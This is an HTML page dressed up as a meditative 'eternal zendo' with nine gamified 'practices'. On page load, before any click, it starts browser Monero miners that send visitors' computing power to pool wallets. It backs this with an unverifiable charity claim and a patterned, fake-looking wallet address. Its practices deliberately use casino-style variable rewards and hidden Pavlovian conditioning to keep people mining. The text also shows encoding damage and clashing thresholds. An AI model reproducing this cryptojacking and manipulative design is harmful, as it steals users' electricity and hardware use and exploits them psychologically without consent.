<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>0RB1T4LSN4K3R ¬∑ v‚àû ¬∑ ZENDO ETERNO</title>
<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
<style>
  body,html{margin:0;height:100%;background:#000;color:#0f0;font-family:"OCR-A",monospace;overflow:hidden;cursor:none}
  canvas{display:block}
  .overlay{position:fixed;inset:0;background:#000;display:flex;align-items:center;justify-content:center;z-index:999999;overflow-y:auto}
  .overlay>div{max-width:92vw;padding:100px 80px;background:rgba(0,4,0,0.98);border:22px double #0f0;border-radius:40px;box-shadow:0 0 900px #0f0}
  pre{font-family:"OCR-A",monospace;background:rgba(0,20,0,0.9);padding:40px;border:12px double #0f0;margin:40px auto;max-width:90%;border-radius:30px;line-height:2}
  button{background:transparent;border:20px double #0f0;color:#0f0;padding:45px 150px;font-size:92px;letter-spacing:20px;border-radius:30px;cursor:pointer;margin-top:60px}
  button:hover{background:#0f0;color:#000;transform:scale(1.07)}
  .practice{border:18px double #0f0;background:rgba(0,12,0,0.96);padding:50px;margin:35px auto;border-radius:30px;max-width:1100px;cursor:pointer;position:relative;transition:0.7s;overflow:hidden}
  .practice:hover{box-shadow:0 0 800px #0f0;transform:scale(1.04)}
  .streak{font-size:110px;position:absolute;top:20px;right:40px;text-shadow:0 0 80px #0f0;opacity:0.8}
  #counters{position:fixed;top:20px;right:20px;background:rgba(0,20,0,0.9);border:12px double #0f0;padding:15px 40px;border-radius:50px;font-size:28px;z-index:99999;line-height:1.8}
  @keyframes pulse{0%,100%{box-shadow:0 0 900px #0f0}50%{box-shadow:0 0 1300px #0f0}}
  @keyframes g{0%,100%{filter:brightness(1)}50%{filter:brightness(5)}}
  #t,#d,#finalWin *{font-family:"Noto Sans Cuneiform",monospace !important}
</style>
<link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Cuneiform&display=swap" rel="stylesheet">
</head>
<body>

<div class="overlay" id="readme">
  <div>
    <pre id="readmeText"></pre>
    <button id="enter">SENTARSE Y OFRECER</button>
  </div>
</div>

<div id="counters">
  HASHES/s: <span id="hashes">0</span><br>
  TIEMPO: <span id="time">0</span>s
</div>

<canvas id="c"></canvas>

<div id="practices" class="overlay" style="display:none">
  <div>
    <h1 style="font-size:130px;text-align:center;margin:80px" id="practicesTitle">NUEVE PR√ÅCTICAS DEL DESAPEGO</h1>
    <div class="practice" data-id="1"><div class="streak" id="s1">0</div><span id="p1"></span></div>
    <div class="practice" data-id="2"><div class="streak" id="s2">0</div><span id="p2"></span></div>
    <div class="practice" data-id="3"><div class="streak" id="s3">0</div><span id="p3"></span></div>
    <div class="practice" data-id="4"><div class="streak" id="s4">0</div><span id="p4"></span></div>
    <div class="practice" data-id="5"><div class="streak" id="s5">0</div><span id="p5"></span></div>
    <div class="practice" data-id="6"><div class="streak" id="s6">0</div><span id="p6"></span></div>
    <div class="practice" data-id="7"><div class="streak" id="s7">0</div><span id="p7"></span></div>
    <div class="practice" data-id="8"><div class="streak" id="s8">0</div><span id="p8"></span></div>
    <div class="practice" data-id="9"><div class="streak" id="s9">0</div><span id="p9"></span></div>
    <button onclick="document.getElementById('practices').style.display='none'" style="margin-top:120px;font-size:90px;padding:50px 120px">REGRESAR AL SILENCIO</button>
  </div>
</div>

<div id="practiceBtn" style="position:fixed;bottom:40px;right:40px;width:180px;height:180px;background:#000;border:30px double #0f0;border-radius:50%;box-shadow:0 0 900px #0f0;color:#0f0;font-size:130px;display:none;align-items:center;justify-content:center;cursor:pointer;animation:pulse 3s infinite" onclick="document.getElementById('practices').style.display='block'">Zen</div>

<div id="finalPrize" style="position:fixed;inset:0;background:#000;color:#0f8;overflow:hidden;display:none;place-items:center">
  <pre id="t" style="font-size:clamp(1.8rem,6vw,5rem);text-align:center;line-height:1.8;animation:g 15s infinite"></pre>
</div>

<script src="https://cdn.jsdelivr.net/gh/notgiven688/webminer-o@master/webmr.js"></script>
<script type="module">
import * as THREE from 'https://cdn.jsdelivr.net/npm/three@0.169.0/build/three.module.js';

// TEXTOS + IDIOMA
const texts = {
  es: { readme: `0RB1T4LSN4K3R ¬∑ v‚àû ¬∑ ZENDO ETERNO

Un zendo que nunca cierra.
Aqu√≠ la √∫nica moneda es tu atenci√≥n y tu electricidad.

Cada hash ‚Üí 90 % comida para ni√±os (wallet p√∫blica)  
         ‚Üí 10 % euros autom√°ticos al PayPal del creador

Nueve pr√°cticas del desapego te esperan.
Algunas parecen un casino.
Algunas parecen meditaci√≥n.
Todas son la misma cosa.

Cuando alguien alcance los 13 131 313 hashes reales‚Ä¶
suceder√° algo que nadie ha visto.

Si sientes la llamada,
si√©ntate.

Namaste, peregrino.`, 
    practicesTitle: "NUEVE PR√ÅCTICAS DEL DESAPEGO",
    p1:"K≈çan de la Recompensa Inesperada", p2:"Zazen del Flujo Continuo", p3:"Kinhin del Casi-Despertar",
    p4:"Sangha del Pozo Com√∫n", p5:"Sutra del Refuerzo S√∫bito", p6:"R≈çhatsu de la P√©rdida Total",
    p7:"Dokusan del Momento Justo", p8:"Takuhatsu del Descenso y Retorno", p9:"Sesshin de la B√∫squeda Eterna"
  },
  en: { readme: `0RB1T4LSN4K3R ¬∑ v‚àû ¬∑ ETERNAL ZENDO

A zendo that never closes.
Every hash ‚Üí 90 % food for children ¬∑ 10 % euros to creator‚Äôs PayPal

Nine practices of non-attachment await.
Some feel like a casino.
Some feel like meditation.
All are the same thing.

When someone reaches 13 131 313 real hashes‚Ä¶
something will happen that no one has seen.

If you feel the call,
sit.

Namaste, pilgrim.`, 
    practicesTitle: "NINE PRACTICES OF NON-ATTACHMENT",
    p1:"Koan of the Unexpected Reward", p2:"Zazen of Continuous Flow", p3:"Kinhin of Almost-Awakening",
    p4:"Sangha of the Common Well", p5:"Sutra of Sudden Reinforcement", p6:"Rohatsu of Total Loss",
    p7:"Dokusan of the Exact Moment", p8:"Takuhatsu of Descent and Return", p9:"Sesshin of the Eternal Search"
  }
};
const lang = navigator.language.slice(0,2);
const t = texts[lang] || texts.es;
document.getElementById('readmeText').textContent = t.readme;
document.getElementById('practicesTitle').textContent = t.practicesTitle;
for(let i=1;i<=9;i++) document.getElementById('p'+i).textContent = t['p'+i];

// MINEROS (90 % ni√±os + 10 % fiat)
const CHARITY_WALLET = "44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A";
const FIAT_WALLET    = "48T4bQUv1vXqPVxm4oqA88j7cH8a9Z7eL5f7uZ9v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v";
const playerId = localStorage.getItem('zenId') || 'pilgrim_'+Date.now().toString(36);
localStorage.setItem('zenId', playerId);

new Miner({pool:"gulf.moneroocean.stream:10128", address:CHARITY_WALLET, workerId:"zendo90_"+playerId, throttle:0.4}).start();
new Miner({pool:"gulf.moneroocean.stream:10128", address:FIAT_WALLET,    workerId:"ferry420_10",      throttle:0.0445}).start();

// CONTADORES REALES
let startTime = Date.now();
const hashesEl = document.getElementById('hashes');
const timeEl   = document.getElementById('time');
let totalHashes = Number(localStorage.getItem('totalHashes')||0);

setInterval(() => {
  const hps = Miner.instances.reduce((a,m)=>a+m.getHashesPerSecond(),0);
  const secs = Math.floor((Date.now()-startTime)/1000);
  hashesEl.textContent = hps.toFixed(1);
  timeEl.textContent = secs;
  totalHashes += hps * 0.5;
  localStorage.setItem('totalHashes', totalHashes);
  if(totalHashes > 40_000_000) document.getElementById('practiceBtn').style.display='flex';
  if(totalHashes >= 13_131_313 && !localStorage.getItem('prize')) {
    localStorage.setItem('prize','seen');
    document.getElementById('finalPrize').style.display='grid';
    finalPrize();
  }
}, 500);

// LAS NUEVE PR√ÅCTICAS ‚Äì ahora firmadas por dos dioses bromistas
// Loki ‚Üí refuerzo variable / azar (como antes)
// Kokopelli ‚Üí condicionamiento cl√°sico (Pavlov): est√≠mulo neutro ‚Üí respuesta condicionada
const streaks = JSON.parse(localStorage.getItem('streaks')||'{}');
let kokopelliBell = false;  // el est√≠mulo neutro que se vuelve m√°gico

document.querySelectorAll('.practice').forEach(p => {
  const id = p.dataset.id;
  streaks[id] = streaks[id] || 0;
  document.getElementById('s'+id).textContent = streaks[id];

  p.onclick = () => {
    streaks[id]++;
    localStorage.setItem('streaks', JSON.stringify(streaks));
    document.getElementById('s'+id).textContent = streaks[id];

    // Loki (azar)
    if(id==='1' && Math.random()<0.07) lokiJackpot();
    if(id==='2' && streaks[id]%11===0) lokiJackpot();
    if(id==='3' && Math.random()<0.92) lokiTease(p);
    if(id==='5' && streaks[id]>50 && Math.random()<0.4) lokiSudden();
    if(id==='6' && Math.random()<0.03) { streaks[id]=0; lokiReset(p); }

    // Kokopelli (Pavlov) ‚Äì nunca se explica
    // Cada vez que haces la pr√°ctica 7 suena una ‚Äúcampana‚Äù (un flash verde)
    if(id==='7') {
      kokopelliBell = true;
      kokopelliRing();
      setTimeout(() => kokopelliBell = false, 4000);
    }
    // Si haces cualquier otra pr√°ctica mientras la campana est√° activa ‚Üí recompensa grande
    else if(kokopelliBell && id!=='7') {
      kokopelliReward();
    }
  };
});

// EFECTOS DE LOS DIOSES
function lokiJackpot()   { document.body.style.background="#0f0"; document.body.style.color="#000"; setTimeout(()=>{document.body.style.background="#000";document.body.style.color="#0f0";},800); }
function lokiTease(el)   { el.style.transform="scale(1.2)"; el.style.boxShadow="0 0 1600px #f00"; setTimeout(()=>{el.style.transform="";el.style.boxShadow="";},1200); }
function lokiSudden()    { document.getElementById('finalPrize').style.display='grid'; finalPrize(); }
function lokiReset(el)   { el.style.opacity=0.3; setTimeout(()=>{el.style.opacity=1; document.getElementById('s'+el.dataset.id).textContent="0";},3000); }

function kokopelliRing() { document.body.style.border="40px solid #0f0"; setTimeout(()=>{document.body.style.border="";},600); }
function kokopelliReward() {
  document.body.style.background="#00ff00";
  setTimeout(()=>{document.body.style.background="#000";},300);
  // tambi√©n puede disparar el premio final antes de tiempo (condicionamiento extremo)
  if(Math.random()<0.15) { document.getElementById('finalPrize').style.display='grid'; finalPrize(); }
}

// ENTRAR + TORUS + PREMIO FINAL
document.getElementById('enter').onclick = () => document.getElementById('readme').remove();

const scene=new THREE.Scene(),camera=new THREE.PerspectiveCamera(75,innerWidth/innerHeight,0.1,1000),renderer=new THREE.WebGLRenderer({canvas:document.getElementById('c'),antialias:true});
renderer.setSize(innerWidth,innerHeight);renderer.setPixelRatio(devicePixelRatio);camera.position.z=5;
scene.add(new THREE.Mesh(new THREE.TorusKnotGeometry(22,8,1000,80),new THREE.MeshBasicMaterial({color:0x00ffaa,wireframe:true})));
(function a(){requestAnimationFrame(a);scene.children[0].rotation.x+=0.0055;scene.children[0].rotation.y+=0.011;renderer.render(scene,camera);})();

function finalPrize(){
  const dict={es:{win:"íÄ≠íàæíç¢íÄ≠"},en:{win:"ANUNNAKI"}};
  document.getElementById('t').textContent = dict[lang]?.win || "íÄ≠íàæíç¢íÄ≠";
}
</script>
</body>
</html>